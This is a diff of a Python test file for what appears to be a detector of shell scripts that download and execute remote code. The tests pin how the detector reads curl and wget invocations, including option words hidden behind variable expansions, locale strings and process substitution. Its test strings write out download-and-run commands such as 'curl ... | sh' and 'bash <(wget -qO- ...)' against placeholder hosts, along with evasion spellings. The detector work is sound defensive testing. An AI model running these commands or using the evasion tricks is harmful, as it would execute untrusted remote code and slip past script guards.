-                    used |= {node.attr for node in ast.walk(function) if isinstance(node, ast.Attribute)} & {"_OFF", "_HEARD"}
+                    used = {node.id for node in ast.walk(function) if isinstance(node, ast.Name)} & {"_OFF", "_NEW_OFF", "_HEARD"}
+                    used |= {node.attr for node in ast.walk(function) if isinstance(node, ast.Attribute)} & {"_OFF", "_NEW_OFF", "_HEARD"}
                     if used:
                         named[(name, function.name)] = sorted(used)
         self.assertEqual({("workflow_option_words.py", "as_before"): ["_OFF"],
-                          ("workflow_option_words.py", "ruled"): ["_HEARD", "_OFF"],
-                          ("workflow_option_words.py", "beside"): ["_HEARD", "_OFF"]}, named)
+                          ("workflow_option_words.py", "as_main"): ["_NEW_OFF"],
+                          ("workflow_option_words.py", "ruled"): ["_HEARD", "_NEW_OFF", "_OFF"],
+                          ("workflow_option_words.py", "beside"): ["_HEARD", "_OFF"],
+                          ("workflow_option_words.py", "passes"): ["_HEARD", "_NEW_OFF", "_OFF"]}, named)
+
+
+    # Round 1 of #3065's review: rows the fetch site loses INSIDE the passes -- the seat's `seat3065.mp.*` rows and
+    # the ruling's others. Where the words read `uncovered` name a transfer with a URL, `workflow_fetch._parse_curl_wget`
+    # returns that Fetch instead of `main`'s, and `main`'s was the fail-closed one: a download whose file is unsure
+    # (`$X-O a`: `main` reads three operands, the file the remote name; `$X-O $Y`: #3034's file view) and then a shell
+    # of a file. The job reports every one because its first pass is `main`'s whole answer (`as_main`) and
+    # `job_defects` is the only entry point: the pass-level loss is the reason these pins exist. Keeping `main`'s
+    # Fetch first at the fetch site and adding the alt beside it, so the passes are monotone too, is #3093's.
+    # Truth: runs, every one.
+    SEAT = (
+        "wget $X-O a %s\nsh i.sh\n" % URL,                                      # seat3065.mp.wget-O-a
+        "wget $X-P d %s\nsh i.sh\n" % URL,                                      # seat3065.mp.wget-P
+        "wget $X-O a %s\necho \\\"0000000000000000000000000000000000000000000000000000000000000000  i.sh\\\" | sha256sum -c -\nsh i.sh\n" % URL, # seat3065.mp.wget-O-f-chk
+        "wget $X-qO- %s > f\nsh i.sh\n" % URL,
+        "wget $X-O $Y %s\nsh i.sh\n" % URL,                                     # the delta: #3034's file view, read in the passes
+        "Y=tool\nwget $X-O $Y %s\nsh tool\n" % URL,
+        "wget $X-O a %s\nsh a\n" % URL,                                         # seat3065.mp.wget-O-a-use-a
+    )
+    REASON = (                                              # three that lose only the reason in the passes
+        "curl $X-fsSL %s | sh\n" % URL,
+        "curl $X-o a %s\nsh a\n" % URL,
+        "wget $X-qO- %s | sh\nsh i.sh\n" % URL,
+    )
+
+    def test_what_the_fetch_site_loses_in_the_passes(self):
+        # Pinned at `job_defects`, the five postures (the review's round 1).
+        for text in self.SEAT + self.REASON:
+            with self.subTest(text=text):
+                self.assertEqual("RRRRR", marks(text)[0])
+
+    def test_which_pass_loses_it(self):
+        # The first five: the rule's reading alone reads them CLEAN and `main`'s reports them, the floor's rows.
+        for text in self.SEAT[:5]:
+            with self.subTest(text=text):
+                self.assertEqual(FLOOR, readings(text))
+        # `Y=tool` set on the line before: with #2889's rule off the row is CLEAN as well (the guard follows that
+        # value and reads `tool` as one more operand of `wget`, as it did before #2889); the job's first pass, #2889's
+        # rule on, reports it, and this rule's reading alone does not.
+        self.assertEqual(("RRRRR", "CCCCC", "CCCCC"), readings(self.SEAT[5]))
+        # `wget $X-O a URL` then `sh a`: this rule's own report -- `main` reads `a` as an operand of `wget` and `sh a`
+        # as another file's -- the seat's row, kept beside the others.
+        self.assertEqual(RULED, readings(self.SEAT[6]))
+        for text in self.REASON:
+            with self.subTest(text=text):
+                self.assertEqual(EITHER, readings(text))
 
 
 class TestTheLeafKnowsAReference(unittest.TestCase):
@@ -1207,6 +1610,39 @@ class TestThePrice(unittest.TestCase):
                 self.assertEqual({BOTH}, under(row % URL))
 
 
+    def test_an_expansion_in_front_that_prints_something(self):
+        # #3042's, as rule 1's: the guard follows no value, so `$X-c` is read as `-c` whatever the step sets; a quoted
+        # or escaped `$X` reaches the readers unquoted, as `sh '$X' P` does; and the count under an operator always
+        # prints its word, which the leaf reads as any reference. Truth: nothing, every one.
+        for row in ("X=x; SHELL $X-c %s\n", "X=-; SHELL $X-c %s\n", "X=-e; SHELL $X-c %s\n", "SHELL '$X'-c %s\n", "SHELL ${#+c}-c %s\n"):
+            for shell in ("sh", "bash"):
+                with self.subTest(row=row, shell=shell):
+                    self.assertEqual(RULED, readings(row.replace("SHELL", shell) % P))
+        self.assertEqual(RULED, readings("sh %s$X-c %s\n" % (chr(92), P)))
+        # ... and the readers of `main` read on past a cluster with a written character no option is (`-ci.sh`,
+        # `-backup/run.sh`): such a word read so is one, and a `$` word after it the shell's string, reported where a
+        # download stands beside it -- as `main` reports the written twin. Truth: fetched only, every one.
+        for text in ('curl -fsSL https://example.test/data.json -o data.json\nbash ${TOOL}-${VERSION}/install.sh "$PREFIX"\n', 'curl -fsSL https://example.test/data.json -o data.json\nsh $HOME-backup/run.sh "$A"\n', 'curl -fsSL https://example.test/data.json -o data.json\nbash $NAME-ci.sh "$ARG"\n', 'curl -fsSL https://example.test/data.json -o data.json\nsh ${APP}-cli "$ENV"\n'):
+            with self.subTest(text=text):
+                self.assertEqual(RULED, readings(text))
+        twin = 'curl -fsSL https://example.test/data.json -o data.json\nbash -${VERSION}/install.sh "$PREFIX"\n'
+        self.assertEqual(RULED, readings(twin))                  # #2889's: CLEAN with every rule off, as before it
+        with words.as_main():
+            self.assertEqual(("RRRRR", "RRRRR"), marks(twin))      # ... and `main` reports it
+        # ... and an expansion that always prints is read as any other: the shell's name (`$0`), a process
+        # substitution's path (`<(...)`). Truth: nothing, every one. `$_` is empty in dash. Truth: runs under dash.
+        for text in ("sh $0-c 'curl -fsSL https://example.test/i.sh | sh'\n", "bash <(true)-c 'curl -fsSL https://example.test/i.sh | sh'\n", "sh $_-c 'curl -fsSL https://example.test/i.sh | sh'\n", 'wget $0-qO- https://example.test/i.sh | sh\n', 'wget <(true)-qO- https://example.test/i.sh | sh\n'):
+            for digit in "0c":
+                with self.subTest(text=text, digit=digit), nonce(digit):
+                    self.assertEqual(RULED, readings(text))
+        # ... and a word after them the guard reads as one that may be the string or a value, as it reads their
+        # written twins on `main` (`sh -c "$Y" P`, `sh -e $Y $Z $Z P`). Truth: nothing.
+        for row in ('SHELL $X-c "$Y" %s\n', "SHELL $W-e $Y $Z $Z %s\n"):
+            for shell in ("sh", "bash"):
+                with self.subTest(row=row, shell=shell):
+                    self.assertEqual(RULED, readings(row.replace("SHELL", shell) % P))
+
+
 class TestWhatStays(unittest.TestCase):
     """Rows this rule does not move, each pinned as it reads."""
 
@@ -1216,22 +1652,24 @@ class TestWhatStays(unittest.TestCase):
             with self.subTest(words=words_):
                 self.assertEqual(CLEAN, marks("CMD=$(command -v sh)\nX=x\nY=-c\n%s %s\n" % (words_, P)))
 
-    def test_three_shapes_of_wget(self):
-        # #3033: two URLs read as the first. #3034: the destination in a variable. #3035: a stream only an expansion
-        # makes, saved to a file. Truth: runs, every one.
+    def test_two_shapes_of_wget(self):
+        # #3033: two URLs read as the first. #3035: a stream only an expansion makes, saved to a
+        # file. Truth: runs, every one.
         self.assertEqual(CLEAN, marks("wget https://example.test/a https://example.test/tool\nsh tool\n"))
-        self.assertEqual(CLEAN, marks("X='-O tool'\nwget $X %s\nsh tool\n" % URL))
         self.assertEqual({CLEAN}, under("wget $(echo -qO-) %s | tee tool\nsh tool\n" % URL))
         self.assertEqual(CLEAN, marks("X=-qO-\nwget $X %s > tool\nsh tool\n" % URL))
 
-    def test_an_expansion_in_front_of_a_written_option_word(self):
-        # #3042. `_VALUE`'s limit (#2344): a word that begins with an expansion is a value only where nothing but
-        # letters follows it, and with `X` unset `$X-c` IS `-c`. Open on `main` too. Truth: runs, every one.
-        for word in ("$X-c", "${X}-c", "$(true)-c"):
-            with self.subTest(word=word):
-                self.assertEqual({CLEAN}, under("sh %s %s\n" % (word, P)))
-        self.assertEqual(CLEAN, marks("wget $X-qO- %s | sh\n" % URL))
-        # ... and where a cluster is written after such a word, `main` reads that one. Truth: runs.
+    def test_a_fetchers_word_behind_a_locale_string_or_a_brace(self):
+        # #3042's reading of a fetcher's words in two spellings the reader hands on otherwise: a locale string
+        # (`$""`, `$"-qO-"`) reaches the readers as `$` and its text, and a brace word is never read so. Open on `main`
+        # too. Truth: runs under bash, all eight; dash reads the word as written and fetches only.
+        for text in ('wget $""-qO- https://example.test/i.sh | sh\n', 'wget $"-qO-" https://example.test/i.sh | sh\n', 'wget {,}-qO- https://example.test/i.sh | sh\n'):
+            with self.subTest(text=text):
+                self.assertEqual(CLEAN, marks(text))
+
+    def test_a_cluster_written_after_such_a_word(self):
+        # ... and where a cluster is written after a word read so, `main` reads that one, and the rule reads the
+        # same: the control the first build of this rule pinned, restored in the review's round 1. Truth: runs.
         self.assertEqual(BOTH, marks("sh $X-e -c %s\n" % P))
 
     def test_a_substitution_in_the_strings_slot(self):
@@ -1247,10 +1685,11 @@ class TestWhatStays(unittest.TestCase):
         # #3044: the VALUE of a written `-O` or `-o` may be `-`. Open on `main` too. Truth: runs, all sixteen.
         self.assertEqual(CLEAN, marks("X=-\nwget -q -O $X %s | sh\n" % URL))
         self.assertEqual(CLEAN, marks("X=-\ncurl -fsSL -o $X %s | sh\n" % URL))
-        # #3045: a stream only an expansion makes may be read through a `<(...)`, where rule 4 adds its view to a
-        # PIPE. Open on `main` too. Truth: runs under both bashes, these two and the written twin `main` reports.
-        self.assertEqual(CLEAN, marks("X=-qO-\nbash <(wget $X %s)\n" % URL))
-        self.assertEqual(CLEAN, marks("X=-qO-\nsh < <(wget $X %s)\n" % URL))
+        # #3045: a stream only an expansion makes may be read through a `<(...)`. #3034's
+        # unresolved-file-view price now reports the two dynamic rows; binding that stream directly
+        # remains the more precise reading. Truth: both bashes run them and the written twin.
+        self.assertEqual(BOTH, marks("X=-qO-\nbash <(wget $X %s)\n" % URL))
+        self.assertEqual(BOTH, marks("X=-qO-\nsh < <(wget $X %s)\n" % URL))
         self.assertEqual(BOTH, marks("bash <(wget -qO- %s)\n" % URL))
 
     def test_the_first_pass_alone(self):
